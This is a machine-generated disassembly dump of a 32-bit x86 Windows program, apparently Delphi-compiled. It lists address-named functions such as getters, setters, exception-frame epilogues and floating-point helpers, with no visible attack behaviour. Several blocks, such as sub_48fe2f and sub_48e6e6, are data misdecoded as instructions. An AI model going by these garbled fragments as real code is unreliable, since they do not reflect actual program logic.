mov [ ecx + edx * 4 ] eax
mov eax [ ebp + 0x8 ]
inc [ eax - 0x8 ]
pop ebp
retn
sub_47e223
jmp sub_403a98
sub_47e22a
mov al [ ebp - 0xd ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_47e56d
jmp sub_403a98
sub_47e574
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_47e667
jmp sub_403a98
sub_47e66e
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_47e6a4
push ebp
mov ebp esp
fld1
fld [ ebp + 0x8 ]
fyl2x
fld1
fld [ ebp + 0x14 ]
fyl2x
fdivp st1
fwait
pop ebp
retn 0x18
sub_47ec08
jmp sub_403a98
sub_47ec0f
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_47eded
jmp sub_403a98
sub_47edf4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47ee17
lea eax [ ebp - 0xc ]
mov edx [ r-xdata ]
call sub_4050d0
retn
sub_47ee10
jmp sub_403a98
sub_47ee17
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_47ee5c
mov edx [ eax + 0x30 ]
mov ecx [ edx + 0x14 ]
push ecx
mov ecx [ eax + 0x34 ]
push ecx
mov ecx [ edx + 0xc ]
mov edx [ edx + 0x8 ]
call sub_47ee88
retn
sub_47f224
mov eax [ eax + 0x8 ]
mov eax [ eax + 0x8 ]
retn
sub_47f800
push ebx
mov ebx eax
mov eax [ ebx + 0x18 ]
call sub_4773b4
xor al 0x1
pop ebx
retn
sub_47f810
lea ecx [ eax + 0x28 ]
mov eax [ eax + 0x20 ]
xchg edx ecx
call sub_481d50
retn
sub_47f820
mov eax [ eax + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_47f82c
mov eax [ eax + 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_47f838
lea ecx [ eax + 0x8 ]
mov eax [ eax + 0x20 ]
xchg edx ecx
call sub_481d1c
retn
sub_47f848
lea ecx [ eax + 0xc ]
mov eax [ eax + 0x20 ]
xchg edx ecx
call sub_482718
retn
sub_47f858
lea ecx [ eax + 0x10 ]
mov eax [ eax + 0x20 ]
xchg edx ecx
call sub_481d50
retn
sub_47f94c
push esi
mov esi eax
mov eax [ esi + 0x18 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
retn
sub_47f95c
cmp dl [ eax + 0x1c ]
je r-xdata
retn
mov [ eax + 0x1c ] dl
mov eax [ eax + 0x20 ]
call sub_481450
sub_47f970
lea ecx [ eax + 0x11 ]
mov eax [ eax + 0x20 ]
xchg edx ecx
call sub_481d50
retn
sub_47fb0c
jmp sub_403a98
sub_47fb13
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_47fda4
cmp [ eax + 0x40 ] 0x0
jne r-xdata
retn
mov edx [ eax + 0x3c ]
test edx edx
je r-xdata
mov eax edx
call sub_480ca0
sub_47fdbc
push ebp
mov ebp esp
add esp 0xfffffff8
xor eax eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] eax
fld [ ebp - 0x8 ]
pop ecx
pop ecx
pop ebp
retn 0x4
sub_47fe3c
jmp sub_403a98
sub_47fe43
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_480382
jmp sub_403a98
sub_480389
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_480468
add esp 0xfffffff8
xor eax eax
mov [ esp ] eax
mov [ esp + 0x4 ] eax
fld [ esp ]
pop ecx
pop edx
retn
sub_480528
jmp sub_403a98
sub_48052f
pop ecx
pop ebp
retn 0x8
sub_480538
cmp dl [ eax + 0x39 ]
je r-xdata
retn
mov [ eax + 0x39 ] dl
call sub_47fda4
sub_480548
cmp dl [ eax + 0x38 ]
je r-xdata
retn
mov [ eax + 0x38 ] dl
call sub_47fda4
sub_480558
mov eax [ eax + 0x3c ]
retn
sub_48055c
test edx edx
je r-xdata
retn
call sub_480444
sub_480568
mov al 0x1
retn
sub_480726
jmp sub_403a98
sub_48072d
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_480780
mov eax [ eax + 0x68 ]
retn
sub_4807a8
mov al 0x1
retn
sub_48090a
lea eax [ ebp - 0x4 ]
call sub_404094
retn
sub_480913
jmp sub_403a98
j_sub_48090a
jmp sub_48090a
sub_48091a
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_480920
mov eax [ eax + 0xf0 ]
xchg edx eax
call sub_419b34
retn
sub_480a50
and [ ebx - 0x1729743e ] cl
mov esi 0x5efff98f
retn
sub_480ad5
jmp sub_403a98
sub_480adc
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_480b3c
mov eax [ eax + 0x8c ]
retn
sub_480b44
mov al 0x1
retn
sub_480b48
mov al 0x1
retn
sub_480c88
push eax
mov eax [ eax ]
mov eax [ eax + 0x144 ]
push eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_472a2c
retn
sub_480ca0
push esi
mov esi [ eax + 0x68 ]
test esi esi
je r-xdata
pop esi
retn
mov edx eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x108 ]
sub_480dd8
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_480d80
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x48 ]
mov edx [ eax ]
call [ edx + 0x8 ]
pop ebp
retn
sub_480fcb
jmp sub_403a98
sub_480fd2
pop ebx
mov esp ebp
pop ebp
retn
sub_481000
cmp eax edx
setne al
retn
sub_481008
mov al 0x1
retn
sub_48100c
call sub_481450
retn
sub_4810ca
jmp sub_403a98
sub_4810d1
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4810dc
mov ecx [ eax + 0x68 ]
test ecx ecx
je r-xdata
retn
xchg ecx eax
xchg edx ecx
call sub_484b28
sub_4810ec
or eax 0xffffffff
retn
sub_481174
push ebx
mov ebx eax
cmp dl [ ebx + 0x90 ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x90 ] dl
mov eax ebx
call sub_4810f0
mov eax ebx
call sub_481450
sub_481198
push ebx
mov ebx eax
cmp dl [ ebx + 0xa0 ]
je r-xdata
pop ebx
retn
mov [ ebx + 0xa0 ] dl
mov eax ebx
call sub_4810f0
mov eax ebx
call sub_481450
sub_4811ff
jmp sub_403a98
sub_481206
pop ebx
pop ecx
pop ebp
retn
sub_481450
push esi
push edi
mov esi eax
mov edi [ esi + 0x68 ]
test edi edi
je r-xdata
pop edi
pop esi
retn
mov eax edi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_481468
retn
sub_48146c
lea ecx [ eax + 0x30 ]
xchg edx ecx
call sub_481d50
retn
sub_4814c1
jmp sub_403a98
sub_4814c8
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
sub_481519
jmp sub_403a98
sub_481520
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
sub_481528
mov edx ecx
mov ecx [ eax ]
call [ ecx + 0xa0 ]
retn
j_sub_403a98#9
jmp sub_403a98
sub_4816f9
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_481700
mov eax edx
retn
j_sub_403a98#8
jmp sub_403a98
sub_4818d2
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_481988
mov ecx [ eax ]
call [ ecx + 0x38 ]
retn
sub_481990
xor ecx ecx
mov dl 0x3
call sub_483268
retn
sub_48199c
push ebx
mov ebx edx
mov eax ebx
call sub_404094
pop ebx
retn
sub_481a78
retn
sub_481a7c
push ebx
cmp [ eax + 0xba ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0xbc ]
call [ ebx + 0xb8 ]
sub_481a9c
push ebx
cmp [ eax + 0xb2 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0xb4 ]
call [ ebx + 0xb0 ]
sub_481cac
jmp sub_403a98
sub_481cb3
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_481ccb
inc [ ecx ]
add [ eax ] al
add [ edi ] dl
add [ eax ] al
xor eax eax
mov [ edx ] eax
xor eax eax
mov [ ecx ] eax
retn
sub_481ce0
xor eax eax
mov [ edx ] eax
xor eax eax
mov [ ecx ] eax
retn
sub_481d1c
cmp ecx [ edx ]
je r-xdata
retn
mov [ edx ] ecx
call sub_481450
sub_481d50
cmp cl [ edx ]
je r-xdata
retn
mov [ edx ] cl
call sub_481450
sub_481e88
push ebx
push 0x0
push 0x0
mov ecx 0x1fffffff
mov ebx [ eax ]
call [ ebx + 0x84 ]
pop ebx
retn
sub_481f98
call sub_481f8c
retn
j_sub_403a98#7
jmp sub_403a98
sub_4820a5
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_4820b8
add esp 0xfffffff8
mov ecx [ eax ]
call [ ecx + 0xfc ]
fstp [ esp ]
fwait
fld [ esp ]
pop ecx
pop edx
retn
sub_482380
jmp sub_403a98
sub_482387
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_482393
inc [ ecx ]
add [ eax ] al
add [ eax ] ah
add [ eax ] al
add [ ebp - 0x357883b8 ] cl
call sub_481d28
retn
sub_4823a8
lea ecx [ eax + 0x6c ]
xchg edx ecx
call sub_481d28
retn
sub_4823f0
mov eax 0x1a
retn
j_sub_403a98#6
jmp sub_403a98
sub_4826ee
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_482718
cmp ecx [ edx ]
je r-xdata
retn
mov [ edx ] ecx
call sub_481450
sub_482a37
jmp sub_403a98
sub_482a3e
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_482a88
lea ecx [ eax + 0x70 ]
xchg edx ecx
call sub_481d50
retn
sub_482a94
call sub_478e84
retn
sub_482a9c
add esp 0xfffffff8
mov eax [ eax + 0x84 ]
mov ecx [ eax ]
call [ ecx + 0xc ]
fstp [ esp ]
fwait
fld [ esp ]
pop ecx
pop edx
retn
sub_482ab4
add esp 0xfffffff8
mov eax [ eax + 0x8c ]
mov ecx [ eax ]
call [ ecx + 0xc ]
fstp [ esp ]
fwait
fld [ esp ]
pop ecx
pop edx
retn
sub_482b80
push ebx
mov ebx eax
mov eax [ ebx + 0x3c ]
call sub_4144b0
mov eax ebx
call sub_481450
pop ebx
retn
sub_482d6c
mov ecx [ eax ]
call [ ecx + 0x5c ]
retn
sub_482e6c
push ebp
mov ebp esp
pop ebp
retn 0x4
sub_482ef4
push ebp
mov ebp esp
pop ebp
retn 0x4
sub_482efc
push ebp
mov ebp esp
pop ebp
retn 0x8
sub_4830c4
push esi
mov esi eax
mov eax [ esi + 0x64 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
retn
sub_4830d4
xor eax eax
mov [ edx + 0x38 ] eax
mov [ edx + 0x3c ] eax
retn
sub_4830e0
lea ecx [ eax + 0x34 ]
xchg edx ecx
call sub_482718
retn
sub_4830ec
add esp 0xfffffff8
mov eax [ eax + 0x84 ]
call sub_47f420
fstp [ esp ]
fwait
fld [ esp ]
pop ecx
pop edx
retn
sub_483104
add esp 0xfffffff8
mov eax [ eax + 0x8c ]
call sub_47f420
fstp [ esp ]
fwait
fld [ esp ]
pop ecx
pop edx
retn
sub_48311c
add esp 0xfffffff8
mov eax [ eax + 0x84 ]
call sub_47f448
fstp [ esp ]
fwait
fld [ esp ]
pop ecx
pop edx
retn
sub_483134
add esp 0xfffffff8
mov eax [ eax + 0x8c ]
call sub_47f448
fstp [ esp ]
fwait
fld [ esp ]
pop ecx
pop edx
retn
sub_483213
jmp sub_403a98
sub_48321a
mov eax [ ebp - 0x4 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_483244
push ebx
mov ebx eax
mov eax [ ebx + 0x48 ]
call sub_414500
mov eax ebx
call sub_480ca0
pop ebx
retn
sub_483258
mov ecx [ eax + 0x60 ]
test ecx ecx
je r-xdata
retn
mov eax ecx
call sub_414500
sub_483344
mov al 0x1
retn
sub_4833eb
jmp sub_403a98
sub_4833f2
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4834ec
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4143bc
pop esi
pop ebx
retn
sub_4836e4
lea ecx [ eax + 0x338 ]
xchg edx ecx
call sub_477b20
retn
sub_4838bb
jmp sub_403a98
sub_4838c2
pop edi
pop esi
pop ecx
pop ebp
retn
sub_483d64
add esp 0xfffffff8
push 0x1
xor ecx ecx
call sub_483a4c
fstp [ esp ]
fwait
fld [ esp ]
pop ecx
pop edx
retn
sub_483d7c
add esp 0xfffffff8
push 0x0
xor ecx ecx
call sub_483a4c
fstp [ esp ]
fwait
fld [ esp ]
pop ecx
pop edx
retn
sub_483d94
add esp 0xfffffff8
push 0x1
mov cl 0x1
call sub_483a4c
fstp [ esp ]
fwait
fld [ esp ]
pop ecx
pop edx
retn
sub_483dac
add esp 0xfffffff8
push 0x0
mov cl 0x1
call sub_483a4c
fstp [ esp ]
fwait
fld [ esp ]
pop ecx
pop edx
retn
j_sub_403a98#5
jmp sub_403a98
sub_483e9b
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
j_sub_403a98#4
jmp sub_403a98
sub_483f76
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_484890
lea ecx [ eax + 0x300 ]
xchg edx ecx
call sub_477b20
retn
sub_4848f0
retn
sub_4848f4
lea ecx [ eax + 0x301 ]
xchg edx ecx
call sub_477b20
retn
sub_484904
mov eax [ eax + 0x2f8 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_484910
mov eax [ eax + 0x2ec ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_48491c
mov eax [ eax + 0x2fc ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_484928
mov eax [ eax + 0x2f0 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_484934
mov eax [ eax + 0x2f4 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_4849f8
push ebp
mov ebp esp
pop ebp
retn 0x4
sub_484b18
lea ecx [ eax + 0x302 ]
xchg edx ecx
call sub_477b20
retn
j_sub_403a98#3
jmp sub_403a98
sub_484be1
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_484d5d
jmp sub_403a98
sub_484d64
pop ebp
retn
sub_485120
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
int3
sub_4855e0
push ebp
mov ebp esp
add esp 0xfffffff8
fld [ ebp + 0x10 ]
fsub [ ebp + 0x8 ]
fstp [ ebp - 0x8 ]
fwait
fld [ ebp - 0x8 ]
pop ecx
pop ecx
pop ebp
retn 0x10
sub_4855fc
push ebp
mov ebp esp
add esp 0xfffffff8
fld [ ebp + 0x10 ]
fmul [ ebp + 0x8 ]
fstp [ ebp - 0x8 ]
fwait
fld [ ebp - 0x8 ]
pop ecx
pop ecx
pop ebp
retn 0x10
sub_4859c9
jmp sub_403a98
sub_4859d0
pop ebp
retn
sub_4859d4
sub [ rw-data ] 0x1
retn
sub_487aac
mov edx [ eax + 0x4 ]
cmp edx [ eax + 0x1c ]
setne al
retn
sub_487b38
mov eax [ eax + 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_487b44
mov eax [ eax + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_487b50
lea ecx [ eax + 0x14 ]
mov eax [ eax + 0x18 ]
xchg edx ecx
call sub_477aa8
retn
sub_487b70
lea ecx [ eax + 0xc ]
mov eax [ eax + 0x18 ]
xchg edx ecx
call sub_477b20
retn
sub_487d38
jmp sub_403a98
sub_487d3f
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_487d88
push esi
mov esi eax
mov eax [ esi + 0x1c ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax esi
call sub_478858
pop esi
retn
sub_487d9c
lea ecx [ eax + 0x30 ]
mov eax [ eax + 0x4 ]
xchg edx ecx
call sub_477b20
retn
sub_487dac
lea ecx [ eax + 0xc ]
mov eax [ eax + 0x4 ]
xchg edx ecx
call sub_477b20
retn
sub_487dbc
cmp dl [ eax + 0xd ]
je r-xdata
retn
mov [ eax + 0xd ] dl
call sub_478858
sub_487dcc
mov eax [ eax + 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_487dd8
lea ecx [ eax + 0x14 ]
mov eax [ eax + 0x4 ]
xchg edx ecx
call sub_477b0c
retn
sub_487de8
mov eax [ eax + 0x18 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
j_sub_403a98#2
jmp sub_403a98
sub_488348
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4884dc
jmp sub_403a98
sub_4884e3
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_488570
mov eax [ eax + 0x3b8 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_48857c
lea ecx [ eax + 0x350 ]
xchg edx ecx
call sub_477b20
retn
sub_48858c
mov eax [ eax + 0x35c ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_488610
push esi
mov esi eax
mov eax [ esi + 0x364 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
retn
sub_48870c
mov eax [ eax + 0x354 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_488718
mov edx [ eax + 0x354 ]
test edx edx
je r-xdata
xor eax eax
retn
mov eax [ edx + 0x10 ]
retn
sub_48872c
mov eax [ eax + 0x354 ]
mov eax [ eax + 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_4887ec
mov eax [ eax + 0x360 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_4887f8
mov eax [ eax + 0x358 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_4888d8
mov ecx [ eax + 0x2b8 ]
cmp [ ecx + 0xc ] 0x0
je r-xdata
retn
cmp [ eax + 0x350 ] 0x0
jne r-xdata
xor ecx ecx
call sub_4783f8
sub_4897dc
push ebx
mov ebx eax
cmp [ ebx + 0x368 ] 0x0
jne r-xdata
mov [ ebx + 0x368 ] 0x1
mov eax ebx
call sub_4781d4
pop ebx
retn
lea edx [ ebx + 0x369 ]
mov eax ebx
call sub_4886cc
sub_489d24
push ebp
mov ebp esp
pop ebp
retn 0x8
sub_489f7c
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_48a14c
lea edx [ esi + 0x5c ]
mov ecx ebx
call sub_477b20
pop esi
pop ebx
retn
sub_489f98
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_48a14c
lea edx [ esi + 0x2c ]
mov ecx ebx
call sub_477b20
pop esi
pop ebx
retn
sub_489fb4
cmp dl [ eax + 0xc ]
je r-xdata
retn
mov [ eax + 0xc ] dl
call sub_478858
sub_489fc4
mov eax [ eax + 0x24 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_489fd0
call sub_478858
retn
sub_489fd8
call sub_478858
retn
sub_48a04c
jmp sub_403a98
sub_48a053
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_48a0bf
jmp sub_403a98
sub_48a0c6
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_48a0cc
cmp dl [ eax + 0x50 ]
je r-xdata
retn
mov [ eax + 0x50 ] dl
call sub_478858
sub_48a0dc
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_48a14c
lea edx [ ebx + 0x30 ]
mov ecx esi
call sub_477b34
pop esi
pop ebx
retn
sub_48a0f8
push ebx
mov ebx eax
cmp dl [ ebx + 0x2d ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x2d ] dl
mov eax ebx
call sub_48a20c
mov eax ebx
call sub_478858
sub_48a114
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_48a14c
lea edx [ ebx + 0x28 ]
mov ecx esi
call sub_477b34
pop esi
pop ebx
retn
sub_48a130
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_48a14c
lea edx [ ebx + 0x58 ]
mov ecx esi
call sub_477b34
pop esi
pop ebx
retn
sub_48a150
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_48a14c
lea edx [ esi + 0x44 ]
mov ecx ebx
call sub_477b20
pop esi
pop ebx
retn
sub_48a16c
mov eax [ eax + 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_48a178
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_48a14c
lea edx [ ebx + 0x14 ]
mov ecx esi
call sub_477b0c
pop esi
pop ebx
retn
sub_48a200
jmp sub_403a98
sub_48a207
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_48a2bc
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_48a14c
lea edx [ ebx + 0x48 ]
mov ecx esi
call sub_477b0c
pop esi
pop ebx
retn
sub_48a2d8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_48a14c
lea edx [ ebx + 0x4c ]
mov ecx esi
call sub_477b34
pop esi
pop ebx
retn
sub_48a2f4
mov eax [ eax + 0x1c ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_48a4f4
jmp sub_403a98
sub_48a4fb
mov eax esi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_48a7c7
jmp sub_403a98
sub_48a7ce
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_48aff9
jmp sub_403a98
sub_48b000
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_48b160
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4143bc
pop esi
pop ebx
retn
sub_48b260
push ebp
mov ebp esp
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
xor ecx ecx
xchg ecx eax
xchg edx ecx
call sub_48b174
pop ebp
retn 0x4
sub_48b2c2
jmp sub_403a98
sub_48b2c9
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_48b330
jmp sub_403a98
sub_48b337
pop ebp
retn
j_sub_403a98
jmp sub_403a98
sub_48b4a7
mov esp ebp
pop ebp
retn
sub_48deec
sahf
hlt
sub_48e6e6
push es
scasb [ edi ]
mov [ eax - 0x384fd78 ] cl
xor bh [ edi - 0x78 ]
daa
adc ecx [ eax - 0x41bb74fe ]
hlt
sub_48fe2f
out 0xfc eax
fwait
neg [ ebx + 0x777773db ]
sahf
imul esi [ edx + 0x77 ] 0x78e7e777
shl [ ecx ] 0x63
hlt
sub_491795
jmp sub_403a98
sub_49179c
pop ebp
retn
sub_491908
jmp sub_403a98
sub_49190f
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_49197f
jmp sub_403a98
sub_491986
pop ebp
retn
